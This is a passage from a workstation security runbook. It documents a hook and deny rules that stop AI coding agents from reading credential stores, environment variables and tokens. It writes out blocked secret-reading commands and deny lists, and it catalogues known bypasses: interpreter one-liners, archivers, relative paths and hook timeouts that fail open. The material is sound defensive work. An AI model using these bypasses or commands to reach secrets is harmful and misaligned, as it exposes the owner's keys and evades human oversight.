  (`sudo 2>/dev/null -u root printenv`): shlex splits `2>` and `2 >` alike, so a descriptor and a value look the same, a
  recorded gap. A redirection is no argument of `set`, `export`, `declare` and `typeset` either: `set > FILE` and
  `set < FILE` still print every variable (`set a b` sets positional parameters), so they are an `environment_dump` now;
  the base guard passed them, and without this the redirection that a keyring exec's arguments carry to the command it
  starts would have made `exec name VAR < FILE -- set` pass, which the base guard refused (found by a grammar fuzz of
  600,000 launcher chains with redirections against the base guard, now 0 looser).
- **An internal error blocks; a timeout does not.** Only exit 2 blocks a PreToolUse call. `main()` now catches any
  exception from the rules (`RecursionError` and `MemoryError` included) and blocks with one line,
  `blocked (guard_error)`, that names no command text and prints no traceback. A hook that runs past its timeout is
  cancelled and the call goes ahead (Claude Code hooks documentation, "Timeouts", read 2026-09-29: "A timed-out
  `command`, `http`, or `mcp_tool` hook doesn't block the tool call"), and the guard's hook timeout is 10 s, so the time
  the rules take is part of the guard's safety and no timer inside the hook can replace it. That is why each text is
  scanned in one pass (a stack of frames and a regular expression that jumps between the characters that matter, not
  a rescan per arithmetic shift or per nesting level), a chain of `env`, `rtk` or `systemd-run` launchers is walked by
  index instead of copying the rest of the command at every hop, and the bodies read behind double-quoted substitutions
  are capped at 32 levels and at four times the command's length plus 64 KiB.
  Measured on this host with the inputs of `PATHOLOGICAL` in `tests/test_secret_path_guard.py`: the first version of the
  substitution scan took 10 s on 12,000 here-documents and on 12,000 lines of `$((1 << 2))`, and ran past a minute on
  60,000 nested `systemd-run`; the launcher walk that predates this work took 29 s on 20,000 nested `env` and 56 s on
  20,000 nested `rtk proxy`. Each input now takes under a second (the test bounds it at 3 s). The dashless `ps` cluster
  test is a set-membership test since 2026-09-29: the regular expression before it had two overlapping quantifiers and
  took 13 to 15 s on `ps` followed by 70,000 `E` and a letter that is no flag (a hook past its timeout fails open), and a
  test now times every compiled pattern of the guard on 70,000-character repeats. Tokenizing is shlex's, about 9
  microseconds a character inside quotes, so from 2026-09-29 `main()` also refuses a command of more than 200,000
  characters as `command_too_large` (exit 2, one line that names no command text, with the hint to put the content in a
  file with the Write tool and pass the path): measured that day, one quoted word of 1,000,000 characters took 10.2 to
  13.0 s in `check()` (the base guard too), 600,000 took 3.8 to 4.4 s, 500,000 took 2.9 to 3.3 s and 200,000 took 0.6 s,
  and a hook that times out blocks nothing. The limit is low enough that both readings of a command always run inside
  the timeout, so no reading is skipped above some length; the slowest of seven shapes of about 199,000 characters (a
  double-quoted or single-quoted text holding `#` throughout, ANSI-C strings, backquotes, subshells) took 1.0 s in
  `check()`. `check()` itself has no size limit. A substitution nested beyond the caps above is still not read.
- **Loosenings against the base guard (c26800f3), 2026-09-29: one.** Everything else this work changes tightens. The
  value of a clustered value-taking `ps` option is no BSD flag cluster: `ps -fu steve` and `ps -fu eve` pass, since `-u`
  takes a value (`ps -u steve` and `ps -fu Eve` passed before), and so do `ps -fo user` and `ps -ft e`; the base guard
  read the word after such a cluster as a dashless `ps eww` and refused it. Each has rows in
  `tests/test_secret_path_guard.py` (ALLOWED), and the probe of the review, base guard against this one, reports
  `loosened rows: 0` apart from them.
- **Alternatives considered for reading shell syntax (2026-09-29).** A full shell parser was not adopted: the hook is one
  standard-library file that the profile installer copies verbatim to the host, and each candidate would have to be
  vendored per platform and started per call. `bashlex` 0.18 (PyPI 2023-01-18, GitHub last pushed 2024-04-08, GPL-3.0)
  is stale, `tree-sitter-bash` (pushed 2026-09-13, MIT) needs compiled bindings, and `mvdan/sh` (pushed 2026-09-28,
  BSD-3-Clause) is a Go binary. The hand-written reading is checked by a differential against the previous guard on
  generated commands and on this repository's own fences and scripts instead, and it stays a text heuristic.

What the guard does not read, each an inert string that `tests/test_secret_path_guard.py` records in
`EXPECTED_PASS_THROUGH` where it passes: a case pattern's `)` closes a `$(` (`echo "$(case x in x) printenv;; esac)"`),
bash 5.3's `${ command; }`, a backquote escaped inside a double-quoted wrapper string
(`bash -c "echo \"\`printenv\`\""`), a long option abbreviated to a unique prefix, which getopt_long accepts
(`systemd-run --mach host --pipe cat .env`, `--uni demo`), `systemd-run -p PassEnvironment=NAME` and words after the
started command, `run0 --setenv=NAME` (no secret name is read on a `run0` line), `machinectl shell .host /usr/bin/printenv`
and `busctl --user get-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager
Environment`, and a substitution nested beyond 32 levels or past the work budget (shlex's quote parity happens to expose
the innermost command of `"$(echo "$(...)")"` one level down, so the tests count the texts read instead). The other
way, the guard reads as commands what is not one: an array literal `x=(env -i A=b)`, a python `set(...)` in a script
body and prose in a here-document that looks like a command (its lines are command lines, above), and an `E`
after `ps -C` that is a command name (`ps -CEmacs`).

## Threat model and what each guard stops

| Layer | Stops | Does not stop |
| --- | --- | --- |
| Store outside every worktree, plus `.gitignore` for `.env*`, `*.env`, `*.key`, `*.pem`, `stored_tokens` and other native-store names (the generic `token` basename is deliberately not listed: it is too broad to ignore repository-wide, and `scripts/credential_status.py`'s `SENSITIVE_BASENAME` makes the same choice) | committing a credential by accident | a value pasted into a tracked file, or a tracked file literally named `token` |
| `scripts/git-hooks/pre-commit` (gitleaks on staged changes) | known secret shapes in a commit, before it is made | `--no-verify`; clones where `core.hooksPath` is not set; values with no recognizable shape |
| CI gitleaks (`validate.yml`), GitHub secret scanning and push protection (public repo) | pushes and history that contain known provider patterns | anything not yet pushed; custom formats. This layer only reacts after the fact |
| Project `.claude/settings.json` deny rules | Claude's Read/Edit tools on the listed paths (including both Hugging Face token files at their default location, and since 2026-09-27 the [home and tool credential stores](#home-and-tool-credential-stores-2026-09-27)); `printenv`, `env`, `gh auth token`, `hf auth token`, `git credential fill`, `gh auth git-credential`; through the `**/` twins, Context Mode's `ctx_execute_file` and `ctx_index` on the same paths | Python or other subprocesses that open the files themselves, including code run by Context Mode's `ctx_execute` or `ctx_batch_execute` that opens a file directly; forms that do not match the rule text; a moved `HF_HOME`; sessions started outside this repository |
| `scripts/hooks/secret_path_guard.py` (PreToolUse, Bash; project settings and, through the profile installer, user settings) | commands that name a store path (the Hugging Face token files also as `$HF_HOME/...` or `$XDG_CACHE_HOME/huggingface/...`); read or copy the whole Hugging Face home; read `/proc/*/environ` in any spelling; dump the environment; reference a secret variable; trace a process; print a native token (`gh auth token`, `hf auth token`, `huggingface-cli ... token`, `--show-token`, and the credential-helper forms `git credential fill`, `git credential-<helper> get`, `gh auth git-credential` that `gh auth setup-git` enables); run a reader (`cat`, `sed`, `awk`, `jq`, ...), copy (`cp`, `scp`, `rsync`) or search (`grep`, `rg`, `ag`, `ack`, `git grep`, `find -exec` with a reader) on a pointer variable such as `$HF_TOKEN_PATH`, a `.env`/`*.env` file, a secret variable **name**, or any path the template's credential-store `Read` denies cover: anything in `~/.ssh`, `~/.gnupg`, `~/.aws`, `~/.azure`, `~/.kube`, an OmniRoute data directory, a `shell_snapshots` directory or the OpenHands runtime-worker `runtime-workers/openhands/secrets` directory, each directory and a glob in it, the Docker home, the Docker, git-credential, netrc, npm and PyPI files, and `nativestack/*.key` ([2026-09-27](#home-and-tool-credential-stores-2026-09-27), which on an RTK host is what stops `cat` of them); redirect a pointer variable such as `$HF_TOKEN_PATH` into a command (`<`, `<<<`, `<>`); turn on shell tracing or verbose mode (`bash -x`, `sh -x`, `set -x`, `set -v`, `set -o xtrace`) in a command that sources a credential file; dump the environment (`env`, `printenv`, `export -p`, `declare -p/-x`, inline `os.environ`) after sourcing one; for the kernel keyring ([Guard coverage](#guard-coverage-2026-09-26)), read a payload (`keyctl print`, `pipe`, `read`, `dh_compute`, `list` or `rlist` on anything but an unambiguous keyring, or a keyring read in inline interpreter code), print part of the Tavily key (`tvly auth` without `--json`), or give `kernel_keyring.py exec` or `tvly-keyring` a command that breaks any rule above, names the injected variable or dumps the environment it inherits, also behind a launcher; each text rule also reads the command after quote removal, and every rule reads the command an `rtk` invocation runs ([2026-09-27](#home-and-tool-credential-stores-2026-09-27)) or a `systemd-run` starts, and so does the body of a command substitution inside double quotes (`echo "$(printenv)"`), and `ps -E` or a dashless `ps` cluster with a capital `E` is an environment dump like `ps e`, and so is `systemctl show-environment`, a service manager's whole environment block; a secret variable set through `systemd-run`'s `-E`, `--setenv` or `-p Environment=` is blocked ([2026-09-29](#launchers-substitutions-and-manager-environments-2026-09-29)) | any Context Mode `ctx_*` call (an MCP tool: the hook is registered for `Bash`, and the guard passes every other tool), a program that imports a loader and prints the result (including `huggingface_hub.get_token()`), an inline interpreter that opens `$HF_TOKEN_PATH` itself (for example `python3 -c "...open(os.environ['HF_TOKEN_PATH'])..."`, which never spells a literal `$HF_TOKEN_PATH`), an archiver such as `tar` on the Hugging Face home, a recursive read or copy of an ancestor directory (`~`, `$HOME`, `~/.cache`, or `$XDG_CACHE_HOME` with a trailing `/` or `/*`) that reaches the Hugging Face home without naming it, a relative read after `cd` into the Hugging Face home, `$HF_HOME/.`, the credential-store gaps recorded under [2026-09-27](#home-and-tool-credential-stores-2026-09-27) (an archiver, a copy or search of `~/.config`, `~/.codex`, `~/.claude` or the runtime-worker state directory, a client that prints its own store, an OmniRoute `DATA_DIR` elsewhere, and `docker exec` into the OpenHands agent-server or a full `docker inspect` of it, which show its session key), obfuscated or renamed paths, a script file that sources and traces on its own, a shell or interpreter started by `exec` that reads its commands from a pipe or a script file, a renamed copy of `kernel_keyring.py`, a variable name assembled at run time, a launcher that takes its command as one string (`script -c`), the macOS `secret run NAME -- command` form, and anything else that is not literal text in the command |
| Codex `[shell_environment_policy] inherit = "none"` | credential and broker variables in the launcher environment reaching Codex shells (measured, see below) | file reads. The setting controls which environment variables a Codex shell inherits, not which files it can open. A Codex shell can still `cat` a store file. The file-level mitigations are the store's location outside every workspace and the Codex sandbox; Codex 0.155.1 has no documented per-path read deny |

In plain terms: an agent running as your user in `bypassPermissions` mode can
still read the Alpaca paper keys. It only has to run a Python one-liner that
calls a loader through `$PAPER_ENV_FILE`. The deny rules and the hook stop
accidents. They are not a security boundary. The Claude Code docs say so
themselves: Read/Edit deny rules "don't apply to ... arbitrary subprocesses",
and Bash rules are "not a security boundary around the program". The only
OS-level floor is the Claude Code sandbox with `credentials.files` deny, and it
covers only Bash commands run inside the sandbox. This host has not enabled
it. Enabling it changes network and filesystem behaviour for every command, so
it is a separate change that has to be measured first. The decision accepts
agent read access to the **paper-only** keys as a residual risk. It accepts
the same for the Hugging Face token, which this runbook limits to reading
public gated repositories: a one-liner that calls
`huggingface_hub.get_token()` also passes the guard. The same residual covers
Context Mode: `ctx_execute` and `ctx_batch_execute` run arbitrary code with the
server's file access (upstream `README.md:1575` at the reviewed revision).
Context Mode checks shell code, and the shell commands it recognises inside
other languages, against the `Bash(...)` deny rules (`src/server.ts:1111-1150,
1744-1750, 3779-3782`), but nothing mediates a file that such code opens
itself, such as Python `open()` or Node `fs.readFileSync`, so a read through
them is part of this accepted risk. The built-in sandbox does not change that: it
applies to Bash, PowerShell and Monitor commands, and MCP servers run
unconstrained on the host
([sandboxing](https://code.claude.com/docs/en/sandboxing),
[sandbox environments](https://code.claude.com/docs/en/sandbox-environments)).
Closing it needs OS-level containment around the whole Claude Code session,
which has to be measured before it is adopted. Live broker
keys are out of scope for this scheme and must not be stored this way.

Other boundaries that are recorded but not closed:

- **WSL2:** a `0600` mode applies only inside the Linux guest. Windows-side
  processes, including Windows-side clients, can read
  `\\wsl.localhost\<distro>\home\...` as the Windows user.
- **Process environment:** Grafana's unit uses `EnvironmentFile=`, so its
  admin values are in that service's process environment. This is accepted
  because Grafana listens on loopback and normal observation uses the
  anonymous Viewer. The subshell pattern above puts values in one child's
  environment for the lifetime of that child.
- **Stores that keep output:** once a value is printed, copies can remain in
  Claude Code transcripts (`~/.claude/projects/`), RTK full-output recall,
  the context-mode knowledge base, ai-memory observations and the local
  OpenTelemetry/Loki stack. See [Telemetry](#telemetry-and-pasted-values).

### Telemetry and pasted values

Claude Code exports prompt, tool and API content to OpenTelemetry only when
these `env` flags are truthy (Claude Code monitoring docs, fetched
2026-09-24): `OTEL_LOG_USER_PROMPTS`, `OTEL_LOG_ASSISTANT_RESPONSES` (falls back
to the prompt flag when unset), `OTEL_LOG_TOOL_DETAILS` (Bash commands and tool
input), `OTEL_LOG_TOOL_CONTENT` (tool output) and `OTEL_LOG_RAW_API_BODIES`
(the whole conversation; the docs say enabling it implies consent to what
the other three reveal). When any of them is on, a value pasted into a prompt
or passed through a tool call is copied into the local OpenTelemetry/Loki
store. Whatever the flags say, the transcript and the ai-memory observations
also keep it. **A pasted key must be rotated**, then its copies purged
(see [Rotation and incidents](#rotation-and-incidents)).

`python3 scripts/credential_status.py --client-guards` reports each flag as
true or false from the key names in `~/.claude/settings.json` and never
prints a value. Measured on this host on 2026-09-24:
`CLAUDE_CODE_ENABLE_TELEMETRY` is on and all five content flags are present
and **false** in `~/.claude/settings.json`. There is no `settings.local.json`
or managed settings file, and the flags are not in the process environment.
The same was true of the two retained settings backups from 2026-09-23. The
earlier text of this page said the user settings enabled tool-content and
raw-body logging; this measurement does not support that statement, so it is
withdrawn. The settings template sets four of them to `"false"`, so
`apply_claude_settings.py` writes them off on a new host. `OTEL_LOG_TOOL_DETAILS`
is `"1"` since the [invoke-rate change](decisions/2026-09-26-tool-invoke-rates.md),
under the dated exception below. The checker still reports
`claude_telemetry_logs_content: true`, because it reads the client flag.

Recommendation, as a user decision: keep tool-content and raw-body logging
off for as long as broker keys exist on the host, and tool details too,
except for the dated exception below. Turning any of them on is a deliberate
choice to copy tool traffic into the local store; the checker then reports
`claude_telemetry_logs_content: true`.

**Exception: tool details (user decision, 2026-09-26).** Asked in the
workstation coordinator session whether to enable `OTEL_LOG_TOOL_DETAILS=1`
with name-only filtering in the Collector, the user answered "1 and full sota
convergence practice we proceed". `adoption/templates/claude.settings.template.json`
changed after `v2026.09.26.2` accordingly: it sets the flag to `"1"`, where a
host at that tag writes `"false"`. Bash commands and tool input still reach the
local Collector, so the control sits there
([decision record](decisions/2026-09-26-tool-invoke-rates.md)):

- `transform/tool_names`, in both logs pipelines before `transform/privacy`,
  copies out of `tool_parameters` only the MCP server and tool names and the
  Agent tool's `subagent_type`, plus one boolean, `shell_rtk`, from the first
  word of `bash_command`. It never reads `full_command`. Skill names come only
  from Claude Code's own `skill_activated` event. MCP server, MCP tool and
  skill names that are not a short identifier become `other`, and an agent
  type outside Claude Code's built-in agents and the workflow child becomes
  `custom`.
- `tool_parameters` (which carries `full_command`) and `tool_input` are
  deleted in that processor. None of them, nor `user.email`, the Skill tool's
  `skill_name` or a workflow name, is on any `transform/privacy` allowlist, so
  none is exported to Loki or `events.jsonl`.
- Canary proof (local integration, 2026-09-26): a scratch replay of real
  Claude Code and Codex captures plus 31 synthetic records, through the
  pinned otelcol-contrib 0.161.0 and a scratch Loki 3.7.8, looked for 72
  known strings: Bash commands, prompts, a workflow script, search queries,
  Codex arguments and output, and agent messages (31 from the captures, 41
  synthetic). None reached the file exporter or Loki, and no
  `tool_parameters`, `tool_input` or `user.*` key was exported (109 of 109
  checks, historical pre-fix evidence). The live host proof ran on
  **2026-09-26T23:47:42Z-23:49:21Z: 33 passed, 0 failed**, with the **pre-fix
  checker**. That checker did not assert fixed bodies and omitted short
  forbidden strings. The corrected structural checker was re-run offline
  against the retained events file: **270 records in 29 batches, 26 forbidden
  strings, zero hits or banned keys; 3 passed, 0 failed** (2026-09-27T03:55Z;
  that file has since rotated out, so the run cannot be repeated). Raw Loki
  bodies from that proof were not retained, so that sink has not been
  re-verified with the corrected checker. The repaired synthetic-only replay
  passed natively on the pinned Collector and Loki with scratch ports:
  **68 passed, 0 failed**. These limits and the historical live output are
  retained in the [evidence receipt](../evidence/artifacts/tool-invoke-rates-20260926/README.md).

Only sessions started after the flag changes carry names. The other four
flags stay `"false"`, and the recommendation above still covers them.

### Measured on this host (2026-09-24, Claude Code 2.1.281, headless `bypassPermissions`)

| Probe | Result |
| --- | --- |
| `printenv NO_SUCH_VAR` | blocked by deny rule `Bash(printenv *)` |
| `ls ~/.config/native-agent-stack` | blocked by the hook (`credential_store_path`) |
| Read tool on a gitignored `.env.probe` fixture | denied by `Read(.env.*)` |
| `cat .env.probe` in Bash | **ran**. The `Read(.env.*)` deny did not stop it, with or without the `!` carve-outs. The hook now blocks readers on `.env` files (`dotenv_read`) |
| `git rev-parse --is-inside-work-tree` | ran (control) |

These probes are a local integration check with a harmless fixture. They
did not test the sandbox, Codex, or a real credential.

## User-level guards (deployed by the Claude profile)

The project file applies only to sessions started in this repository. The
managed Claude user profile carries the same guards to every session on a
host, and the documented installer deploys them on every new PC
([`adoption/bootstrap.md`](../adoption/bootstrap.md) step 4a):

- `python3 tools/adoption/install_claude_profile.py --only guard` copies
  `scripts/hooks/secret_path_guard.py` to `~/.claude/hooks/secret_path_guard.py`,
  refusing unless its sha256 matches
  [`adoption/hooks/claude/SHA256SUMS`](../adoption/hooks/claude/SHA256SUMS)
  (paths relative to that file, so `sha256sum -c SHA256SUMS` also verifies it).
- [`adoption/templates/claude.settings.template.json`](../adoption/templates/claude.settings.template.json)
  carries every deny rule from `.claude/settings.json` and a `PreToolUse`
  `Bash` hook that runs the installed guard. `render_config.py` and
  `apply_claude_settings.py` merge both into `~/.claude/settings.json`; the
  merge keeps host-only rules and hooks. The hook command does nothing when the
  guard file is missing, so applying the settings before installing the guard
  never blocks every Bash call; `--client-guards` reports
  `claude_user_secret_guard_hook: false` until both are in place.

In this repository both the project hook and the user hook run. They are the
same file, so the second run only repeats the verdict. Because the user hook
runs in every project, its rules avoid ordinary work: copying a `.env.example`
to `.env`, writing to a `.env` file, sourcing one to run a program, `set -x`
without sourcing, and `/proc` reads other than `environ` all pass. One
deliberate trade-off remains: a shell search for a listed secret variable
name, such as `grep -rn GITHUB_TOKEN .github`, is blocked even in code; use
the Grep tool, which Claude's `Read` deny rules cover, for that search. `tests/test_secret_path_guard.py`
checks that an installed host copy is byte-identical to the repository file
(skipped in CI and on a host without it). After the guard or the deny rules
change, for example when the Hugging Face rules were added, rerun
`python3 tools/adoption/install_claude_profile.py --only guard` and render and
apply the settings template again on each host. That test fails on a host
until its guard copy is replaced.

For a host that does not use the template, merge the same rules by hand under
`permissions.deny` in `~/.claude/settings.json`:

```json
"Read(~/.config/native-agent-stack/**)", "Read(**/.config/native-agent-stack/**)",
"Edit(~/.config/native-agent-stack/**)",
"Read(~/.config/ecosystem-observability/*.env)", "Read(**/.config/ecosystem-observability/*.env)",
"Read(~/.config/nativestack/*.key)", "Read(**/.config/nativestack/*.key)",
"Read(~/.claude/.credentials.json)", "Read(**/.claude/.credentials.json)",
"Read(~/.codex/auth.json)", "Read(**/.codex/auth.json)",
"Read(~/.config/gh/hosts.yml)", "Read(**/.config/gh/hosts.yml)",
"Read(//proc/*/environ)", "Read(**/proc/*/environ)",
"Read(~/.cache/huggingface/token)", "Read(**/.cache/huggingface/token)",
"Read(~/.cache/huggingface/stored_tokens)", "Read(**/.cache/huggingface/stored_tokens)",
"Read(~/.ssh/**)", "Read(**/.ssh/**)", "Read(~/.gnupg/**)", "Read(**/.gnupg/**)",
"Read(~/.aws/**)", "Read(**/.aws/**)", "Read(~/.azure/**)", "Read(**/.azure/**)",
"Read(~/.kube/**)", "Read(**/.kube/**)", "Read(~/.docker/config.json)", "Read(**/.docker/config.json)",
"Read(~/.git-credentials)", "Read(**/.git-credentials)", "Read(~/.netrc)", "Read(**/.netrc)",
"Read(~/.npmrc)", "Read(**/.npmrc)", "Read(~/.pypirc)", "Read(**/.pypirc)",
"Read(~/.omniroute/**)", "Read(**/.omniroute/**)", "Read(~/.config/omniroute/**)", "Read(**/.config/omniroute/**)",
"Read(~/.codex/shell_snapshots/**)", "Read(**/.codex/shell_snapshots/**)",
"Read(//mnt/*/Users/*/AppData/Roaming/omniroute/**)", "Read(**/mnt/*/Users/*/AppData/Roaming/omniroute/**)",
"Read(//mnt/*/Users/*/.omniroute/**)", "Read(**/mnt/*/Users/*/.omniroute/**)",
"Read(~/.local/state/native-agent-stack/runtime-workers/openhands/secrets/**)",
"Read(**/.local/state/native-agent-stack/runtime-workers/openhands/secrets/**)",
"Edit(~/.bashrc)", "Edit(~/.profile)", "Edit(~/.zshrc)",
"Bash(printenv)", "Bash(printenv *)", "Bash(env)", "Bash(gh auth token *)",
"Bash(hf auth token)", "Bash(hf auth token *)",
"Bash(git credential fill*)", "Bash(gh auth git-credential *)"
```

Each `~/` or `//` Read rule has a `**/` twin (changed 2026-09-26). Claude Code
reads `~/` and `//` as anchors and bounds a `**/` pattern to the current
directory ([permissions](https://code.claude.com/docs/en/permissions)). Context
Mode 1.0.169 applies the same Read deny rules to the paths `ctx_execute_file`
and `ctx_index` receive, but it compiles each pattern literally, without
expanding `~/` or `//`, and tests it against the path's raw, resolved and
canonical absolute forms (`src/security.ts:101-135, 616-655` at the reviewed
revision `6f0cc684`; upstream tracks the anchors as #1075). Each form is
therefore inert in the other engine, and the pair covers both. The project
settings and the template also carry `Read(**/.env)` and `Read(**/.env.*)`
right after `Read(.env)` and `Read(.env.*)`, before `Read(!.env.example)` and
`Read(!.env.*.example)`: a `!` carve-out reaches only the rules listed before
it in the same file, so a twin placed after the carve-outs would deny
`.env.example` again. Context Mode has no `!` carve-outs, so its
`ctx_execute_file` refuses `.env.example` as well; read that file with the
native Read tool. `apply_claude_settings.py` inserts a missing template rule
next to its template neighbours, so it keeps this order on a host whose file
already holds the carve-outs.

### Home and tool credential stores (2026-09-27)

The template and the project settings also deny Claude's file tools the
credential stores that other tools keep in the home directory: `~/.ssh`,
`~/.gnupg`, `~/.aws`, `~/.azure`, `~/.kube`, `~/.docker/config.json`,
`~/.git-credentials`, `~/.netrc`, `~/.npmrc` and `~/.pypirc`, each with its
`**/` twin (corroborated by trailofbits/claude-code-config at `2109be9`,
`settings.json`). Three more stores join them:

- **OmniRoute's data directory.** It holds the gateway's SQLite database,
  with the provider OAuth tokens and API keys it holds, its logs and
  backups (`.env.example`, lines 36-41), and it may hold `.env` layers. Without `DATA_DIR`, upstream uses a legacy `~/.omniroute` when it
  exists, else `%APPDATA%\omniroute` on Windows, else
  `$XDG_CONFIG_HOME/omniroute`, else `~/.omniroute`, and it falls back to
  that default when a configured `DATA_DIR` is not writable
  (diegosouzapw/OmniRoute `src/lib/dataPaths.ts` at `a58000c7`, lines 40-62
  and 175-190). The rules deny `~/.omniroute`, `~/.config/omniroute` and,
  for a Windows gateway reached from WSL2, both Windows defaults under the
  default `/mnt/<drive>` mount. The template alone carries the two
  `//mnt/*/Users/*/...` rules. A gateway with a `DATA_DIR` elsewhere needs
  its own `Read(//<DATA_DIR>/**)` rule and twin in that host's user
  settings; never commit such a path. `Read(**/.env)` does not cover a
  `.env` outside the project, so these directory rules are what keep the
  gateway's `.env` from the Read tool.
- **Codex shell snapshots.** With `shell_snapshot` on, Codex writes
  `$CODEX_HOME/shell_snapshots/*.sh`, which record `declare -xp` for every
  exported name and so hold exported values (openai/codex `rust-v0.157.1`,
  `codex-rs/shell-command/src/shell_snapshot_exports.rs`), at mode `0644`, as a
  GPT-6 probe of the landscape-sweep lane reproduced with its provider key
  ([sweep README](../tools/sota-convergence/landscape-sweep/README.md)). The rules cover
  `~/.codex/shell_snapshots`; a lane-local `CODEX_HOME` elsewhere is covered
  only by the guard's reader rule below.
- **OpenHands runtime-worker session keys (2026-09-28).** For each attempt
  the runtime worker's host driver (PR #425, which adds the
  `openhands-session` inventory row) generates an agent-server session key
  and writes it at mode `0600`, in a `0700` directory, to
  `~/.local/state/native-agent-stack/runtime-workers/openhands/secrets/`:
  `<run-id>-<arm>.server.env` in Docker env-file syntax
  (`OH_SESSION_API_KEYS_0=<value>`) and `<run-id>-<arm>.headers`, a header
  line that curl reads with `-H @file`. It deletes both once the attempt's
  containers are confirmed removed. The template alone carries
  `Read(~/.local/state/native-agent-stack/runtime-workers/openhands/secrets/**)`
  and its twin, because the user settings reach every session on the host.

The template alone adds `Edit(~/.bashrc)`, `Edit(~/.profile)` and
`Edit(~/.zshrc)`: the operator, not an agent, writes the pointer exports of
[Picking up in a new session](#picking-up-in-a-new-session).

What this changes, from the [permissions](https://code.claude.com/docs/en/permissions)
reference: a `Read` deny also blocks Edit and Write on the path, applies to
the file commands Claude Code recognizes in Bash (`cat`, `head`, `tail`,
`sed`, `tee`, redirections) and, best effort, to Grep and Glob, and it
holds in `bypassPermissions` too
([permission modes](https://code.claude.com/docs/en/permission-modes)). It
does not stop `grep -r` run inside the directory or a subprocess that opens
the file itself. The whole `~/.ssh` directory is denied, so Claude's file
tools cannot read `config`, `known_hosts` or `*.pub` either; carving those
out with `Read(!...)` rules is an open user decision. Because a `**/` twin
matches under the working directory, a project's own `.npmrc`, `.netrc` or
`.pypirc` is denied as well, as a project `.env` already is.

**On a host that runs RTK's Claude hook, which the template registers
(`rtk hook claude`), that Bash coverage does not reach `cat`, `head` or
`tail -n`.** RTK 0.50.0 rewrites them to `rtk read FILE` (rtk-ai/rtk
`v0.50.0`, `src/discover/rules.rs`), and Claude Code evaluates its
permission rules against the command a hook returns
([hooks](https://code.claude.com/docs/en/hooks), PreToolUse
`updatedInput`). `rtk read` is not a file command it recognizes, and `rtk`
is not one of the wrappers it strips (permissions, "Wrappers"). RTK leaves
a command alone only when a `Bash(...)` deny rule matches it and ignores
`Read(...)` rules (`src/hooks/permissions.rs`, `append_bash_rules`). In a
probe project holding the template's 86 deny rules, `rtk hook check`
rewrote `cat ~/.ssh/config`, `cat ~/.ssh/*`, `head -n 5
~/.aws/credentials` and `tail -n 3 ~/.kube/config` to `rtk read ...` and
`grep token ~/.kube/config` to `rtk grep ...`. It left a bare `tail FILE`,
`sed`, `tee` and input redirections unchanged, and the `Read` denies still
apply to those
([decision record](decisions/2026-09-27-claude-harness-settings.md#evidence)).
The guard is what stops the rewritten readers. It reads the command as
Claude wrote it, before any rewrite, and its deny wins over RTK's rewrite:
matching hooks run in parallel, and `deny` outranks every other decision a
hook returns ([hooks](https://code.claude.com/docs/en/hooks): `deny` >
`defer` > `ask` > `allow`). The permissions reference names such a hook as
the way to inspect the full command text ("What a Bash rule doesn't
match").

`scripts/hooks/secret_path_guard.py` therefore blocks a reader, copy or
search of every path those `Read` denies cover as `credential_file_read`.
That is anything in `~/.ssh`, `~/.gnupg`, `~/.aws`, `~/.azure`, `~/.kube`,
an OmniRoute data directory, any `shell_snapshots` directory or a
`runtime-workers/openhands/secrets` directory (since 2026-09-28; its
`.server.env` files, which the dotenv rule already caught, are now reported
as reads of the directory), each
directory itself and a glob in it (`cp -r ~/.ssh`, `grep -r BEGIN
~/.ssh`, `cat ~/.aws/*`, `find ~/.ssh -type f -exec cat {} +`). It also
covers the files `~/.docker/config.json`, `~/.git-credentials`,
`~/.netrc`, `~/.npmrc` and `~/.pypirc`, any `*.key` in a `nativestack`
directory, and the Docker home as a whole (`cp -r ~/.docker`, as for the
Hugging Face home). Like the template, it
covers `config`, `known_hosts`, `*.pub` and a key under any name; a
`~/.ssh` carve-out would change both. `tests/test_secret_path_guard.py`
derives a path from every anchored `Read` deny of the template and the
project settings, and expects `cat`, `head -n`, `tail -n` and `rtk read`
of that path to be blocked.

Clients that use a key or a store (`ssh -i`, `ssh-add`, `ssh-keygen -y
-f`, `kubectl --kubeconfig`, `curl --netrc`, `gh ssh-key add`, `docker run
--env-file`), listings, `stat` and `chmod` pass, because the user hook runs
in every session.
Four clients name a store as the operand of a program the guard treats
as a reader, so they are blocked too: `scp -i KEY`, `rsync -e 'ssh -i
KEY'`, `gpg --homedir ~/.gnupg` and `curl -H @FILE` on an OpenHands header
file named by its path. A key named in `~/.ssh/config` or
loaded with `ssh-add`, and `gpg` without `--homedir`, avoid that. A search's own
pattern is not a file it reads (grep(1): `PATTERNS [FILE...]`), so `rg
shell_snapshots docs` and `grep -nF '.ssh/id_ed25519' README.md` pass.
When `-e`, `-f` or an option that can take a file or glob comes first
(`--include .netrc`, rg's `-g`), every argument counts, erring toward
blocking. `cp -t DIR` makes all its other operands sources (cp(1)), and
dd's `of=` file is written, not read.

Recorded gaps, asserted in `tests/test_secret_path_guard.py`:

- a relative read after `cd`;
- a client that prints its own store (`kubectl config view --raw`, `gpg
  --export-secret-keys`);
- a program that opens a store itself, such as `sqlite3` on the gateway
  database;
- an archiver (`tar czf k.tgz ~/.ssh`);
- a glob that names a store only after the shell expands it (`~/.n*rc`);
- a copy or search of an ancestor of a store (`~/.config`, `~/.codex`,
  which holds `shell_snapshots`, or the runtime-worker state directory
  `runtime-workers/openhands`, which holds `secrets`);
- a copy or search of a directory that holds an older store file
  (`~/.claude`, whose `.credentials.json` the guard blocks only by name);
- an OmniRoute `DATA_DIR` elsewhere;
- a store path the guard sees only after the shell or the program resolves
  it (2026-09-28 cross-family review; every item passes on the base guard
  too, for example `cat ~/.config/./omniroute/gateway.sqlite`): a `./` or an
  interior `//` in the path, since the match is on the literal text; a path
  relative to a parent (`< runtime-workers/openhands/secrets/F cat` or
  `tar -cf - runtime-workers/openhands/secrets` from the state directory);
  and a reader fed by a pipeline (`find DIR -print0 | xargs -0 cat`, `find
  DIR -exec rtk read {} +`), although `find -exec cat` and `xargs cat` with a
  store operand are blocked;
- the OpenHands agent-server's own environment (2026-09-28): `docker exec
  <server> printenv`, or a shell in the container, and a full `docker
  inspect <server>`, whose `Config.Env` holds the key, show the session
  key, and the guard does not model docker subcommands. The variable name
  `OH_SESSION_API_KEYS_0` is not one of the guard's secret names. The
  runtime worker's host driver (#425) never exports it on the host: it
  writes the value only to the two private files and passes their paths
  (`--env-file`, `curl -H @file`), so `$OH_SESSION_API_KEYS_0` in a host
  command expands to nothing. Listing the name would also stop an explicit
  lookup inside the container (`docker exec <server> sh -c 'echo
